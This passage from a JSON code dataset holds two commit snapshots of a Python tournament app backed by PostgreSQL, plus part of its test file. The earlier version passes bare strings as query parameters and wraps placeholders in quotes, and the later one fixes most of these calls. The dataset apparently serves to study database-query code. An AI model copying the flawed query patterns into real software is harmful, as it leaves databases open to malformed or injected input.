0)\n        q = \"SELECT * FROM matches ORDER BY id LIMIT 1\"\n        p = tools.query(q)\n        i2 = p[0][0]\n        i2 = str(i2 + 2)\n        with self.assertRaises(LookupError):\n            tournament.reportMatch(p1=i1, p2=i2)\n        \n    def test_p1_contains_letter(self):\n        \"\"\"reportMatch() throws if player 1 ID contains letter\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.reportMatch(p1=\"A\", p2=1)\n        \n    def test_p1_contains_symbol(self):\n        \"\"\"reportMatch() throws if player 1 ID contains symbol\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.reportMatch(p1=\"$\", p2=1)\n        \n    def test_p2_contains_letter(self):\n        \"\"\"reportMatch() throws if player 2 ID contains letter\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.reportMatch(p1=2, p2=\"A\")\n        \n    def test_p2_contains_symbol(self):\n        \"\"\"reportMatch() throws if player 2 ID contains symbol\"\"\"\n        with self.assertRaises(AttributeError):\n            tournament.reportMatch(p1=2, p2=\"%\")\n\n\nclass TestSwissMatching(BaseTestCase):\n    def setUp(self):\n        create_dummy_data()\n\n    def test_no_players(self):\n        \"\"\"swissPairings() throws if there are no players in the database\"\"\"\n        q = \"TRUNCATE TABLE players;\"\n        tools.query(q)\n        with self.assertRaises(ValueError):\n            tournament.swissPairings()\n\n\nclass TestLatestMatch(BaseTestCase):\n    def setUp(self):\n        create_dummy_data()\n\n    def test_latest_match(self):\n        \"\"\"latest_match() function executes without issue\"\"\"\n\n    def test_latest_match_not_found(self):\n        \"\"\"latestMatch() throws SystemExit when no match is found\"\"\"\n\n\nclass TestListWinRanking(BaseTestCase):\n    def setUp(self):\n        create_dummy_data()\n\n    def test_list_win_ranking(self):\n        \"\"\"playerStandings() function executes without issue\"\"\"\n        self.assertTrue(tournament.playerStandings())\n\n\n\nif __name__ == '__main__':\n    unittest.main(verbosity=3, buffer=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/johlym/tournament/blob/fe7569782e49aa3a681ca2e1770008853190fed0",
        "file_path": "/tournament.py",
        "source": "#!/usr/bin/env python\n\n\"\"\"\nTOURNAMENT MATCHUP APPLICATION\n Simulates 1-on-1 matchups and swiss ranked matches. Queries a pgSQL database\n for match and player information.\n\"\"\"\n\nimport argparse as arg\nimport config as cfg\nimport datetime\nfrom decimal import Decimal\nfrom prettytable import PrettyTable\nimport psycopg2\nimport random\nimport re\nimport sys\nimport time\nimport tools\n\n\ndef check_version(sys_version):\n    \"\"\"\n    Let's check to make sure the user is running at least Python 2.7. Since\n    this app was coded with that version, it would make sense.\n    \"\"\"\n    # Check if python version is less than 2.7\n    if sys_version < (2, 7):\n        # if so, let the user know.\n        message = \"Version out of spec.\"\n        print message\n        time.sleep(3.0)  # Wait before proceeding through the app.\n        verstat = 1\n    else:\n        verstat = 0\n    return verstat\n\n\ndef connect():\n    # Connect to the PostgreSQL database.  Returns a database connection.\n    return psycopg2.connect(database=cfg.DATABASE_NAME,\n                            user=cfg.DATABASE_USERNAME,\n                            password=cfg.DATABASE_PASSWORD)\n\n\ndef registerPlayer(player_name=\"\", country=\"\"):\n    \"\"\"\n    Create a new player based on their name and country of origin. We expect\n    the following:\n    - Player Name\n    - Player Country of Origin\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    # check for numbers in player name\n    if re.search('[0-9]', player_name):\n        raise AttributeError(\"Player name is invalid (contains numbers)\")\n    # check if player name is shorter than 2 char.\n    if len(player_name) < 2:\n        raise AttributeError(\"Player name is less than 2 characters.\")\n    # player name is missing surname\n    if \" \" not in player_name:\n        raise AttributeError(\"Player name is invalid. (missing surname)\")\n    # player name shouldn't contain symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', player_name):\n        raise AttributeError(\"Player name is invalid. (contains symbol(s))\")\n    # if a country isn't provided.\n    if not country:\n        raise SystemExit(\"Country of Origin Not Provided.\")\n    print \"Creating new entry for %s from %s\" % (player_name, country)\n    code = player_name[:4].lower() + str(random.randrange(1000001, 9999999))\n    start = time.time()\n    # Unlike other queries in this app, we don't use the % symbol,\n    # which allows psycopg2 to auto-escape any crazy single-quote-containing\n    # names. This way, one can add all the O'Malleys and O'Neals they desire!\n    cursor.execute(\"INSERT INTO players (name, country, code) \"\n                   \"VALUES (%s, %s, %s);\", (player_name, country,\n                                                         code))\n    stop = time.time()\n    # Using the start and stop time values above, we can print out how long\n    # it took to complete this action.\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Successfully created new entry in %s seconds\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deletePlayer(player=\"\"):\n    \"\"\"\n    Delete an existing player based on their ID. We expect the following:\n    - Option (edit or delete)\n    - Player ID\n    - New Player Name (if edit)\n    - New Country of Origin (if edit)\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\", player)\n    search = cursor.fetchall()\n    # if player ID wasn't found in search, raise an exception.\n    if not search:\n        raise LookupError(\"Invalid Player ID or ID Not Found.\")\n    cursor.execute(\"DELETE FROM players WHERE id = %s\", player)\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deletePlayers():\n    \"\"\"Deletes ALL players from the database.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    # empty the players table\n    cursor.execute(\"TRUNCATE players;\")\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef editPlayer(player=\"\", new_name=\"\", new_country=\"\"):\n    \"\"\"Edit a player in the database, based on 'player',\n    and using 'new_name' and 'new_country'.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    # if both a name and country aren't provided, raise an exception.\n    if not (new_name and new_country):\n        raise AttributeError(\"New Information Not Provided.\")\n    player_name = new_name\n    player_country = new_country\n    start = time.time()\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\", player)\n    search = cursor.fetchall()\n    # if player ID wasn't found in search, raise an exception.\n    if not search:\n        raise LookupError(\"Invalid Player ID.\")\n    cursor.execute(\"UPDATE players \"\n                   \"SET name=\\'%s\\', country=\\'%s\\' \"\n                   \"WHERE id=%s\", (player_name, player_country, player))\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef list_players():\n    \"\"\"\n    Get a list of players based on criteria and display method.\n    We expect the following:\n    - Limit to display\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    print \"List All Players.\"\n    cursor.execute(\"SELECT * FROM players;\")\n    results = cursor.fetchall()\n    count = 0\n    if not results:  # if there aren't any players\n        print \"No players found.\"\n        status = 1\n    else:\n        print \"Here's a list of all players in the database: \"\n        start = time.time()\n        # Start building the output table.\n        table = PrettyTable(['ID', 'NAME', 'COUNTRY'])\n        table.align = 'l' # left-align the table contents.\n        # Loop through the data and generate a table row for each iteration.\n        for row in results:\n            count += 1\n            table.add_row([row[0], row[1], row[2]])\n        # Finally, print the table.\n        print table\n        stop = time.time()\n        dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                        rounding=\"ROUND_UP\"))\n        print \"Returned %s results in %s seconds\" % (count, dur[:5])\n        connection.commit()\n        cursor.close()\n        connection.close()\n        status = 0\n    return status\n\n\ndef reportMatch(p1=\"\", p2=\"\"):\n    \"\"\"\n    Initiate a match. We expect the following:\n    - ID of Player 1\n    - ID of Player 2\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    p1_code = ''\n    p2_code = ''\n    p1_name = ''\n    p2_name = ''\n    # if both players aren't provided\n    if not (p1 and p2):\n        raise AttributeError(\"Both player IDs need to be provided.\")\n    # if player 1's ID contains one or more letters\n    if re.search('[A-Za-z]', str(p1)):\n        raise AttributeError(\"Player 1 ID contains letter(s).\")\n    # if player 2's ID contains one or more letters\n    if re.search('[A-Za-z]', str(p2)):\n        raise AttributeError(\"Player 2 ID contains letter(s).\")\n    # if player 1's ID contains one or more symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', str(p1)):\n        raise AttributeError(\"Player 1 ID is invalid. (contains symbol(s))\")\n    # if player 2's ID contains one or more symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', str(p2)):\n        raise AttributeError(\"Player 2 ID is invalid. (contains symbol(s))\")\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\", p1)\n    code_lookup = cursor.fetchall()\n    if not code_lookup:  # if player 1 can't be found\n        raise LookupError(\"Player 1 ID does not exist.\")\n    # Correlate a player's unique code to their name\n    for row in code_lookup:\n        p1_code = row[3]\n        cursor.execute(\"SELECT * FROM players \"\n                                     \"WHERE code=\\'%s\\'\", p1_code)\n        player_name = cursor.fetchall()\n        for result in player_name:\n            p1_name = result[1]\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\", p2)\n    code_lookup = cursor.fetchall()\n    if not code_lookup:  # if player 2 can't be found\n        raise LookupError(\"Player 2 ID does not exist.\")\n    # and again for player 2\n    for row in code_lookup:\n        p2_code = row[3]\n        cursor.execute(\"SELECT * FROM players \"\n                                     \"WHERE code=\\'%s\\'\", p2_code)\n        cursor.execute(\"SELECT * FROM players WHERE id=%s\", p2)\n        player_name = cursor.fetchall()\n        for result in player_name:\n            p2_name = result[1]\n    print \"%s vs. %s... \" % (p1_name, p2_name),\n    if (not p1_name) or (not p2_name):\n        raise ValueError(\"One of the two players you entered doesn't exist.\")\n    # In this world, the first player always wins. One could call this\n    # function and randomly choose who's is first position in order to make\n    # it fair.\n    winner = p1_code\n    loser = p2_code\n    print \"Winner: %s\" % p1_name\n    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]\n    cursor.execute(\"INSERT INTO matches (player_1, player_2, \"\n                   \"timestamp) \"\n                   \"VALUES (\\'%s\\', \\'%s\\', \\'%s\\');\", (winner, loser, ts))\n    connection.commit()\n    cursor.close()\n    connection.close()\n    status = 0\n    return status\n\n\ndef swissPairings():\n    \"\"\"\n    match up each of the players in the database and swiss-ify them.\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    bye = ''\n    player_pairs = []\n    round_number = 0\n    start = time.time()\n    cursor.execute(\"SELECT * FROM players;\")\n    players_list = cursor.fetchall()\n    # Count the number of players in the list\n    count = len(players_list)\n    if count == 0:\n        raise ValueError(\"No players found.\")\n    # If there isn't an even amount:\n    if count % 2:\n        print count\n        # simple math.\n        bye = players_list[count - 1]\n        players_list.pop(random.randrange(0,count))\n        print len(players_list)\n    \"\"\" Since it's technically pure coincidence that the entries were in order,\n    we need to explicitly sort them. Defaults to the ID for sorting as it's\n    the first non-symbol in each entry.\n    If we did the list organization in the database, it would require extra\n    cycles in the code to get the data right. \"\"\"\n\n    players_list1 = players_list[:len(players_list)/2]\n    players_list2 = players_list[len(players_list)/2:]\n    # Flip the second dict; faster than using the reversed() builtin.\n    tx = PrettyTable([\"TEAM A\", \"TEAM B\"])\n    # some master table settings we need to declare for formatting purposes\n    tx.align = \"c\"\n    tx.hrules = False\n    tx.vrules = False\n    tx.left_padding_width = 0\n    tx.right_padding_width = 0\n    ta = tools.table_gen(['ID', 'Name', 'Country'], players_list1, \"l\")\n    tb = tools.table_gen(['ID', 'Name', 'Country'], players_list2, \"l\")\n    tx.add_row([ta, tb])\n    print tx\n    if bye:\n        print \"Bye: \" + bye[1]\n    # smoosh (technical term) the two lists together and make them fight\n    # for their dinner!\n    for a, b in zip(players_list1, players_list2):\n        round_number += 1\n        print \"Round %i: \" % round_number,\n        reportMatch(p1=str(a[0]), p2=str(b[0]))\n        player_pairs.append([a[0], a[1], b[0], b[1]])\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    print \"Swiss matchups complete.\"\n    connection.commit()\n    cursor.close()\n    connection.close()\n    status = 0\n    return player_pairs\n\n\ndef deleteMatch(match=\"\"):\n    \"\"\"\n    Delete an existing match. We expect the following:\n    - Match ID\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    if not match:\n        raise ValueError(\"An ID # is required.\")\n    start = time.time()\n    cursor.execute(\"DELETE FROM matches where id=%s\", match)\n    stop = time.time()\n\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deleteMatches():\n    \"\"\"\n    Delete ALL matches from the database.\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    cursor.execute(\"TRUNCATE matches;\")\n    stop = time.time()\n\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef latest_match():\n    \"\"\"\n    Get the latest match's information\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    print \"The Latest Match\"\n    name = ''\n    count = 0\n    returned_id = 0\n    start = time.time()\n    cursor.execute(\"SELECT * FROM matches ORDER BY id DESC LIMIT 1\")\n    results = cursor.fetchall()\n    # Generate the table\n    table = PrettyTable(['#', 'ID#', 'P1 ID', 'P2 ID', 'WINNER', 'TIME'])\n    table.align = 'l'\n    for row in results:\n        count += 1\n        # Generate the rows for the table\n        cursor.execute(\"SELECT * FROM players \"\n                       \"WHERE code=\\'%s\\'\", row[3])\n        player = cursor.fetchall()\n        for entry in player:\n            name = entry[1]\n        if name == '':\n            name = \"[PLAYER DELETED]\"\n        table.add_row([count, row[0], row[1], row[2], name, row[4]])\n        returned_id = row[0]\n    print table\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Returned %s results in %s seconds\" % (count, dur[:5])\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return returned_id\n\n\ndef playerStandings():\n    \"\"\"\n    Rank players by the number of wins. Get the list of wins and total\n    matches for each player.\n    \"\"\"\n    count = 0\n    returned_blob = []\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    cursor.execute(\"SELECT * from players;\")\n    player_blob = cursor.fetchall()\n    table = PrettyTable([\"ID\", \"PLAYER\", \"WINS\", \"MATCHES\"])\n    table.align = \"l\"\n    for player in player_blob:\n        count += 1\n        # Count the number of times the player has won (they are present in\n        # player_1 column inside tournament.matches).\n        cursor.execute(\"SELECT count(*) \"\n                       \"FROM matches \"\n                       \"WHERE player_1='%s'\", player[3])\n        wins_blob = cursor.fetchall()\n        wins_num = wins_blob[0][0]\n        # Count the number of times the player has lost (they are present in\n        # player_2 column inside tournament.matches).\n        cursor.execute(\"SELECT count(*) \"\n                       \"FROM matches \"\n                       \"WHERE player_2='%s'\", player[3])\n        losses_blob = cursor.fetchall()\n        matches_num = losses_blob[0][0] + wins_num\n        table.add_row([player[0], player[1], wins_num, matches_num])\n        returned_blob.append([player[0], player[1], wins_num, matches_num])\n    print table\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Returned %s results in %s seconds\" % (count, dur[:5])\n    return returned_blob\n\n\ndef countPlayers():\n    \"\"\"A function needed to fulfill the requirements of Udacity's\n    tournament_test.py. This function gets used to count the number of\n    players in the Players table.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    cursor.execute(\"SELECT COUNT(id) FROM players;\")\n    result = cursor.fetchall()\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return result[0][0]\n\n\ndef argument_parser():\n    \"\"\"\n    Using command-line arguments to control actions. User can use flags to run\n    certain, pre-defined scenarios. This will also allow for reuse of code where\n    applicable.\n    \"\"\"\n    parser = arg.ArgumentParser(description=cfg.APP_DESCRIPTION)\n\n    # NEW PLAYER function\n    parser.add_argument('--new-player', '-n',\n                        dest='registerPlayer',\n                        action='store',\n                        nargs='+',\n                        metavar='FIRST LAST COUNTRY',\n                        help='Create a new player.')\n\n    # NEW MATCH function\n    parser.add_argument('--new-match', '-m',\n                        dest='new_match',\n                        action='store',\n                        nargs=\"+\",\n                        metavar='ID#1 ID#2',\n                        help='Create a new match. Provide two player IDs.')\n\n    # SWISS MATCHUP function\n    parser.add_argument('--swiss-match', '-s',\n                        dest='swissPairings',\n                        action='store_true',\n                        default=False,\n                        help='Create a new match with swiss pairing.')\n\n    # GET LATEST RESULTS function\n    parser.add_argument('--latest-match', '-l',\n                        dest='latest_match',\n                        action='store_true',\n                        default=False,\n                        help='Get the results from the latest match.')\n\n    # DELETE PLAYER function\n    parser.add_argument('--delete-player', '-d',\n                        dest='deletePlayer',\n                        action='store',\n                        metavar='ID',\n                        help='Remove a player from the match system.')\n\n    # EDIT PLAYER function\n    parser.add_argument('--edit-player', '-e',\n                        dest='editPlayer',\n                        action='store',\n                        nargs='+',\n                        metavar='ID NEWNAME NEWCOUNTRY',\n                        help='Edit a player\\'s exiting information.')\n\n    # DELETE MATCH function\n    parser.add_argument('--delete-match', '-f',\n                        dest='deleteMatch',\n                        action='store',\n                        metavar='ID',\n                        help='Remove a match from the match system.')\n\n    # LIST PLAYERS function\n    parser.add_argument('--list-players', '-p',\n                        dest='list_players',\n                        action='store_true',\n                        default=False,\n                        help='List all players.')\n\n    # LIST RANKED function\n    parser.add_argument('--list-ranking', '-t',\n                        dest='list_ranking',\n                        action='store_true',\n                        default=False,\n                        help='List rankings.')\n\n    return parser\n\n\n# ROUTING LOGIC #\ndef main():\n    parser = argument_parser()\n    args = parser.parse_args()\n    if args.registerPlayer:\n        registerPlayer(player_name=(args.registerPlayer[0] + ' ' + args.registerPlayer[1]),\n                   country=args.registerPlayer[2])\n\n    if args.new_match:\n        players = args.new_match\n        reportMatch(p1=players[0], p2=players[1])\n\n    if args.swiss_match:\n        swissPairings()\n\n    if args.deletePlayer:\n        deletePlayer(player=str(args.delete_player))\n\n    if args.editPlayer:\n        name = \"%s %s\" % (args.editPlayer[1], args.editPlayer[2])\n        editPlayer(player=str(args.editPlayer[0]),\n                    new_name=name, new_country=args.editPlayer[3])\n\n    if args.list_players:\n        list_players()\n\n    if args.deleteMatch:\n        deleteMatch(match=str(args.deleteMatch))\n\n    if args.latest_match:\n        latest_match()\n\n    if args.list_ranking:\n        playerStandings()\n\n    # IF NO ARGUMENTS #\n\n    # Print all options.\n\n    if len(sys.argv) == 1:\n        parser.print_help()\n\n\nif __name__ == \"__main__\":\n    check_version(sys.version_info)\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/johlym/tournament/blob/89c921e777f06845be04526f0c5a8c4eed409b22",
        "file_path": "/tournament.py",
        "source": "#!/usr/bin/env python\n\n\"\"\"\nTOURNAMENT MATCHUP APPLICATION\n Simulates 1-on-1 matchups and swiss ranked matches. Queries a pgSQL database\n for match and player information.\n\"\"\"\n\nimport argparse as arg\nimport config as cfg\nimport datetime\nfrom decimal import Decimal\nfrom prettytable import PrettyTable\nimport psycopg2\nimport random\nimport re\nimport sys\nimport time\nimport tools\n\n\ndef check_version(sys_version):\n    \"\"\"\n    Let's check to make sure the user is running at least Python 2.7. Since\n    this app was coded with that version, it would make sense.\n    \"\"\"\n    # Check if python version is less than 2.7\n    if sys_version < (2, 7):\n        # if so, let the user know.\n        message = \"Version out of spec.\"\n        print message\n        time.sleep(3.0)  # Wait before proceeding through the app.\n        verstat = 1\n    else:\n        verstat = 0\n    return verstat\n\n\ndef connect():\n    # Connect to the PostgreSQL database.  Returns a database connection.\n    return psycopg2.connect(database=cfg.DATABASE_NAME,\n                            user=cfg.DATABASE_USERNAME,\n                            password=cfg.DATABASE_PASSWORD)\n\n\ndef registerPlayer(player_name=\"\", country=\"\"):\n    \"\"\"\n    Create a new player based on their name and country of origin. We expect\n    the following:\n    - Player Name\n    - Player Country of Origin\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    # check for numbers in player name\n    if re.search('[0-9]', player_name):\n        raise AttributeError(\"Player name is invalid (contains numbers)\")\n    # check if player name is shorter than 2 char.\n    if len(player_name) < 2:\n        raise AttributeError(\"Player name is less than 2 characters.\")\n    # player name is missing surname\n    if \" \" not in player_name:\n        raise AttributeError(\"Player name is invalid. (missing surname)\")\n    # player name shouldn't contain symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', player_name):\n        raise AttributeError(\"Player name is invalid. (contains symbol(s))\")\n    # if a country isn't provided.\n    if not country:\n        raise SystemExit(\"Country of Origin Not Provided.\")\n    print \"Creating new entry for %s from %s\" % (player_name, country)\n    code = player_name[:4].lower() + str(random.randrange(1000001, 9999999))\n    start = time.time()\n    # Unlike other queries in this app, we don't use the % symbol,\n    # which allows psycopg2 to auto-escape any crazy single-quote-containing\n    # names. This way, one can add all the O'Malleys and O'Neals they desire!\n    cursor.execute(\"INSERT INTO players (name, country, code) \"\n                   \"VALUES (%s, %s, %s);\", (player_name, country,\n                                                         code))\n    stop = time.time()\n    # Using the start and stop time values above, we can print out how long\n    # it took to complete this action.\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Successfully created new entry in %s seconds\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deletePlayer(player=\"\"):\n    \"\"\"\n    Delete an existing player based on their ID. We expect the following:\n    - Option (edit or delete)\n    - Player ID\n    - New Player Name (if edit)\n    - New Country of Origin (if edit)\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    player = str(player)\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\", (player,))\n    search = cursor.fetchall()\n    # if player ID wasn't found in search, raise an exception.\n    if not search:\n        raise LookupError(\"Invalid Player ID or ID Not Found.\")\n    cursor.execute(\"DELETE FROM players WHERE id = %s\", (player,))\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef deletePlayers():\n    \"\"\"Deletes ALL players from the database.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    start = time.time()\n    # empty the players table\n    cursor.execute(\"TRUNCATE players;\")\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef editPlayer(player=\"\", new_name=\"\", new_country=\"\"):\n    \"\"\"Edit a player in the database, based on 'player',\n    and using 'new_name' and 'new_country'.\"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    # if both a name and country aren't provided, raise an exception.\n    if not (new_name and new_country):\n        raise AttributeError(\"New Information Not Provided.\")\n    player_name = new_name\n    player_country = new_country\n    start = time.time()\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\", (player,))\n    search = cursor.fetchall()\n    # if player ID wasn't found in search, raise an exception.\n    if not search:\n        raise LookupError(\"Invalid Player ID.\")\n    cursor.execute(\"UPDATE players \"\n                   \"SET name=%s, country=%s \"\n                   \"WHERE id=%s\", (player_name, player_country, player))\n    stop = time.time()\n    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                    rounding=\"ROUND_UP\"))\n    print \"Complete. Operation took %s seconds.\" % dur[:5]\n    connection.commit()\n    cursor.close()\n    connection.close()\n    return 0\n\n\ndef list_players():\n    \"\"\"\n    Get a list of players based on criteria and display method.\n    We expect the following:\n    - Limit to display\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    print \"List All Players.\"\n    cursor.execute(\"SELECT * FROM players;\")\n    results = cursor.fetchall()\n    count = 0\n    if not results:  # if there aren't any players\n        print \"No players found.\"\n        status = 1\n    else:\n        print \"Here's a list of all players in the database: \"\n        start = time.time()\n        # Start building the output table.\n        table = PrettyTable(['ID', 'NAME', 'COUNTRY'])\n        table.align = 'l' # left-align the table contents.\n        # Loop through the data and generate a table row for each iteration.\n        for row in results:\n            count += 1\n            table.add_row([row[0], row[1], row[2]])\n        # Finally, print the table.\n        print table\n        stop = time.time()\n        dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),\n                                                        rounding=\"ROUND_UP\"))\n        print \"Returned %s results in %s seconds\" % (count, dur[:5])\n        connection.commit()\n        cursor.close()\n        connection.close()\n        status = 0\n    return status\n\n\ndef reportMatch(p1=\"\", p2=\"\"):\n    \"\"\"\n    Initiate a match. We expect the following:\n    - ID of Player 1\n    - ID of Player 2\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    p1_code = ''\n    p2_code = ''\n    p1_name = ''\n    p2_name = ''\n    # if both players aren't provided\n    if not (p1 and p2):\n        raise AttributeError(\"Both player IDs need to be provided.\")\n    # if player 1's ID contains one or more letters\n    if re.search('[A-Za-z]', str(p1)):\n        raise AttributeError(\"Player 1 ID contains letter(s).\")\n    # if player 2's ID contains one or more letters\n    if re.search('[A-Za-z]', str(p2)):\n        raise AttributeError(\"Player 2 ID contains letter(s).\")\n    # if player 1's ID contains one or more symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', str(p1)):\n        raise AttributeError(\"Player 1 ID is invalid. (contains symbol(s))\")\n    # if player 2's ID contains one or more symbols\n    if re.search('[!@#$%^&*\\(\\)~`+=]', str(p2)):\n        raise AttributeError(\"Player 2 ID is invalid. (contains symbol(s))\")\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\", (p1,))\n    code_lookup = cursor.fetchall()\n    if not code_lookup:  # if player 1 can't be found\n        raise LookupError(\"Player 1 ID does not exist.\")\n    # Correlate a player's unique code to their name\n    for row in code_lookup:\n        p1_code = row[3]\n        cursor.execute(\"SELECT * FROM players \"\n                                     \"WHERE code=\\'%s\\'\", (p1_code,))\n        player_name = cursor.fetchall()\n        for result in player_name:\n            p1_name = result[1]\n    cursor.execute(\"SELECT * FROM players WHERE id=%s\", (p2,))\n    code_lookup = cursor.fetchall()\n    if not code_lookup:  # if player 2 can't be found\n        raise LookupError(\"Player 2 ID does not exist.\")\n    # and again for player 2\n    for row in code_lookup:\n        p2_code = row[3]\n        cursor.execute(\"SELECT * FROM players \"\n                                     \"WHERE code=\\'%s\\'\", (p2_code,))\n        cursor.execute(\"SELECT * FROM players WHERE id=%s\", (p2,))\n        player_name = cursor.fetchall()\n        for result in player_name:\n            p2_name = result[1]\n    print \"%s vs. %s... \" % (p1_name, p2_name),\n    if (not p1_name) or (not p2_name):\n        raise ValueError(\"One of the two players you entered doesn't exist.\")\n    # In this world, the first player always wins. One could call this\n    # function and randomly choose who's is first position in order to make\n    # it fair.\n    winner = p1_code\n    loser = p2_code\n    print \"Winner: %s\" % p1_name\n    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]\n    cursor.execute(\"INSERT INTO matches (player_1, player_2, \"\n                   \"timestamp) \"\n                   \"VALUES (\\'%s\\', \\'%s\\', \\'%s\\');\", (winner, loser, ts))\n    connection.commit()\n    cursor.close()\n    connection.close()\n    status = 0\n    return status\n\n\ndef swissPairings():\n    \"\"\"\n    match up each of the players in the database and swiss-ify them.\n    \"\"\"\n    connection = connect()\n    cursor = connection.cursor()\n    bye = ''\n    player_pairs = []\n    round_number = 0\n    start = time.time()\n    cursor.execute(\"SELECT * FROM players;\")\n    players_list = cursor.fetchall()\n    # Count the number of players in the list\n    count = len(players_list)\n    if count == 0:\n        raise ValueError(\"No players found.\")\n    # If there isn't an even amount:\n    if count % 2:\n        print count\n        # simple math.\n        bye = players_list[count - 1]\n        players_list.pop(random.randrange(0,count))\n        print len(players_list)\n    \"\"\" Since it's technically pure coincidence that the entries were in order,\n    we need to explicitly sort them. Defaults to the ID for sorting as it's\n    the first non-symbol in each entry.\n    If we did the list organization in the database, it would require extra\n    cycles in the code to get the data right. \"\"\"\n\n    players_list1 = players_list[:len(players_list)/2]\n    players_list2 = players_list[len(players_list)/2:]\n    # Flip the second dict; faster than using the reversed() builtin.\n    tx = PrettyTable([\"TEAM A\", \"TEAM B\"])\n    # some master table settings we need to declare for formatting purposes\n    tx.align = \"c\"\n    tx.hrules = False\n    tx.vrules = False\n    tx.left_padding_width = 0\n    tx.right_padding_width = 0\n    ta = tools.table_gen(['ID', 'Name', 'Country'], players_list1, \"l\")\n    tb = tools.table_gen(['ID', 'Name', 'Country'], players_list2, \"l\")\n    tx.add_row([ta, tb])\n    print tx\n    if bye:\n        print \"Bye: \" + bye[1]\n    # smoosh (technical term) the two lists together and make them fight\n    # for their dinner!\n    for a, b in zip(players_list1, players_list2):\n        round_number += 1\n        print \"Round %i: \" % round_number,\n        reportMatch(p1=str(a[0]), p2=str(b[0]))\n        player_pairs.append([a[0], a[1], b[0], b[1]])\n    stop = time.time()\n    dur = str(Decimal(float(stop - 